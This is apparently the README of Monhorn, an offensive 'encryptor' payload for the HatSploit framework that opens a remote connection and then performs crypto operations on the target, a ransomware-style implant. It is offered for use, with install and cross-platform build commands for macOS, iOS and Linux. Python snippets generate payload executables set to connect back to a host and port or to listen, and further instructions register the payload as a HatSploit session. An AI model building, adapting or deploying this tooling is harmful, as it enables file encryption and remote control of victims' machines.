# Monhorn

<p>
    <a href="https://entysec.netlify.app">
        <img src="https://img.shields.io/badge/developer-EntySec-3572a5.svg">
    </a>
    <a href="https://github.com/EntySec/Monhorn">
        <img src="https://img.shields.io/badge/language-C-grey.svg">
    </a>
    <a href="https://github.com/EntySec/Monhorn/stargazers">
        <img src="https://img.shields.io/github/stars/EntySec/Monhorn?color=yellow">
    </a>
</p>

Monhorn is an implementation of HatSploit encryptor that firstly establishes a remote connection and then begins crypto operations.

## Installing

You should install HatSploit to get Monhorn, because Monhorn depends on HatSploit Framework.

```
pip3 install git+https://github.com/EntySec/HatSploit
```

## Building Monhorn

**Dependencies:** `ssl`, `crypto`

These are platforms which are supported by Monhorn.

* **macOS** - `make all platform=macos sdk=<path>`
* **Apple iOS** - `make all platform=apple_ios sdk=<path>`
* **Linux** - `make all platform=linux`

**NOTE:** To compile for target `macos` you will need to download patched SDKs from [here](https://github.com/phracker/MacOSX-SDKs) and to compile for `apple_ios` target you will need to download patched SDKs from [here](https://github.com/theos/sdks).

## Basic usage

To use Monhorn and build payloads you should import it to your source.

```python3
from monhorn import Monhorn
from monhorn import MonhornSession
```

* `Monhorn` - Monhorn utilities, mostly for generating payloads and encoding arguments.
* `MonhornSession` - Wrapper for `HatSploitSession` for Monhorn, HatSploit should use it with Monhorn payload.

To get Monhorn template, you should call `get_template()`.

```python3
from monhorn import Monhorn

monhorn = Monhorn()
template = monhorn.get_template('linux', 'x64')
```

To encode Monhorn data, you should call `encode_data()`.

```python3
from monhorn import Monhorn

monhorn = Monhorn()
args = monhorn.encode_data('127.0.0.1', 8888)
```

To get Monhorn executable, you should call `get_monhorn()`.

```python3
from monhorn import Monhorn

monhorn = Monhorn()
executable = monhorn.get_monhorn('linux', 'x64', '127.0.0.1', 8888)
```

**NOTE:** If you want Monhorn to connect you should specify both `host` and `port`, but if you want Monhorn to listen, you should specify only `port`.

## Adding Monhorn payload

To add Monhorn payload to HatSploit you should follow these steps.

* Write a basic HatSploit payload template.
* Import `Monhorn` and `MonhornSession` and put `Monhorn` to `HatSploitPayload` class.
* Set payload parameter `Session` to `MonhornSession`.
* Return `get_monhorn()` with platform, architecture and host and port specified.

```python3
return self.get_monhorn(
    self.details['Platform'],
    self.details['Architecture'],
    remote_host,
    remote_port
)
```
